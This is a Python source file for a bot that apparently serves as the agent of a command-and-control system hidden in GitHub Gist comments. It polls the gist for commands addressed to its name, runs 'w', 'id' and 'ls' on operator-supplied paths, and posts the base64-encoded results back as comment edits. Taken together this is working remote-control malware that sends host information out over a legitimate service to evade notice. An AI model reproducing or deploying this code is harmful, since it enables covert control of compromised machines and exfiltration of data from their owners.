import requests
import subprocess
import os
import sys
import re
import commands as cmd
import utils as u
from time import sleep
from dotenv import load_dotenv


class Bot:
    def __init__(self, gist_id, name):
        self.name = name
        self.filename = name + os.getenv("BOT_FILE_EXTENSION")
        self.gist_url = os.getenv("GITHUB_API_URL") + "gists/" + gist_id
        self.headers = {
            "Accept": "application/vnd.github+json",
            "Authorization": "Bearer " + os.getenv("GITHUB_API_TOKEN"),
            "X-GitHub-Api-Version": "2022-11-28",
        }

    def run(self):
        print("Running as %s" % self.name)
        if not self.name_available():
            print("Bot name is not available")
            exit(1)
        self.login()
        self.listen()

    def listen(self):
        last_tag = None
        headers = self.headers.copy()
        while True:
            if last_tag is not None:
                headers.update({"If-None-Match": last_tag})
            res = requests.get(self.gist_url + "/comments", headers=headers)
            if res.status_code == 304:
                sleep(1)
                continue
            last_tag = res.headers["ETag"]
            for comment in res.json():
                if comment["body"].startswith(self.name + " ") and not bool(re.search("✅", comment["body"])):
                    command = re.search(self.name + "\s(.*)\n", comment["body"]).group(1)
                    print("received command %s" % command)

                    if command == cmd.COMMAND_USERS["command"]:
                        result = subprocess.run(["w"], stdout=subprocess.PIPE)
                        data = u.encode_data_to_markdown(u.encode_data_to_base64(result.stdout))
                    elif command == cmd.COMMAND_PING["command"]:
                        data = u.encode_data_to_markdown(u.encode_data_to_base64("Pong".encode(encoding="UTF-8")))
                    elif command == cmd.COMMAND_ID["command"]:
                        result = subprocess.run(["id"], stdout=subprocess.PIPE)
                        data = u.encode_data_to_markdown(u.encode_data_to_base64(result.stdout))
                    elif command == cmd.COMMAND_DIRECTORY["command"]:
                        path = self.get_command_argument(comment["body"])
                        result = subprocess.run(
                            ["ls", path],
                            stdout=subprocess.PIPE,
                        )
                        data = u.encode_data_to_markdown(u.encode_data_to_base64(result.stdout))

                    data = {"body": comment["body"] + "\n" + data}
                    res = requests.patch(
                        self.gist_url + "/comments/" + str(comment["id"]),
                        json=data,
                        headers=headers,
                    )
                    if res.status_code != 200:
                        print("Could not update comment in Gist")
                        print(res.json())
                        exit(1)

    def name_available(self):
        res = requests.get(self.gist_url, headers=self.headers)
        if res.status_code == 200:
            return self.filename not in res.json()["files"]
        else:
            return True

    def login(self):
        data = {"files": {self.filename: {"content": "Hello World!"}}}
        res = requests.patch(self.gist_url, json=data, headers=self.headers)
        if res.status_code != 200:
            print("Could not create file in Gist")
            print(res.json())
            exit(1)

    def get_command_argument(self, message: str) -> str:
        return re.search("<!---ARG-(.*)-->", message).group(1)


def main(args):
    load_dotenv()
    if len(args) < 2:
        print("Usage: %s <name>" % args[0])
        exit(1)
    bot_name = "".join(x for x in args[1] if x.isalnum())
    bot = Bot(os.getenv("GIST_ID"), bot_name)
    bot.run()


if __name__ == "__main__":
    main(sys.argv)
